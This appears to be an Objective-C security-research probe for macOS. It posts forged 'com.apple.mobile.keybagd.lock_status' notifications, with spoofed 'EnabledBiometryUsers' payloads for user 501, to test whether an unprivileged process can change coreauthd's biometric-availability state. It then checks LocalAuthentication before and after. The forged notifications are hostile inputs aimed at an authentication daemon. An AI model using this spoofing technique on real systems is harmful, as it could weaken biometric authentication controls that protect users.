// Layer-2 experiment: can an unprivileged process feed coreauthd the
// "EnabledBiometryUsers" hint through com.apple.mobile.keybagd.lock_status?
//
// coreauthd has KeyBagLockStatusObserver listening on that name and reads
// userInfo["EnabledBiometryUsers"]. If the observer is on the distributed
// centre, any local process can post it. Read-only towards the system: the
// only side effect is a notification post, which coreauthd may ignore.
#import <Foundation/Foundation.h>
#import <LocalAuthentication/LocalAuthentication.h>
#import <notify.h>

static BOOL availability(NSString *label)
{
    LAContext *context = [LAContext new];
    NSError *error = nil;
    BOOL can = [context canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
                                   error:&error];
    printf("%-28s can=%d code=%ld type=%ld\n", label.UTF8String, can,
           (long)error.code, (long)context.biometryType);
    return can;
}

static void dumpEnvironment(void)
{
    Class environmentClass = NSClassFromString(@"LAEnvironment");
    if (!environmentClass)
        return;
    @try {
        id environment = [environmentClass performSelector:NSSelectorFromString(@"currentUser")];
        id state = [environment valueForKey:@"state"];
        id biometry = [state valueForKey:@"biometry"];
        printf("LAEnvironment.state.biometry = %s\n",
               biometry ? [[biometry description] UTF8String] : "(nil)");
    } @catch (NSException *exception) {
        printf("LAEnvironment probe failed: %s\n", exception.reason.UTF8String);
    }
}

int main(void)
{
    @autoreleasepool {
        availability(@"baseline");

        NSDistributedNotificationCenter *distributed = [NSDistributedNotificationCenter defaultCenter];
        NSDictionary *payloads[] = {
            @{@"EnabledBiometryUsers": @[@501]},
            @{@"EnabledBiometryUsers": [NSSet setWithObject:@501]},
            @{@"EnabledBiometryUsers": @{@"501": @YES}},
        };
        const char *labels[] = {"distributed array", "distributed set", "distributed dict"};
        for (size_t index = 0; index < 3; index++) {
            [distributed postNotificationName:@"com.apple.mobile.keybagd.lock_status"
                                       object:nil
                                     userInfo:payloads[index]
                           deliverImmediately:YES];
            usleep(400 * 1000);
            availability([NSString stringWithUTF8String:labels[index]]);
        }

        // The same name is also a Darwin notification; keybagd may use both.
        notify_post("com.apple.mobile.keybagd.lock_status");
        usleep(400 * 1000);
        availability(@"darwin post");

        dumpEnvironment();
    }
    return 0;
}
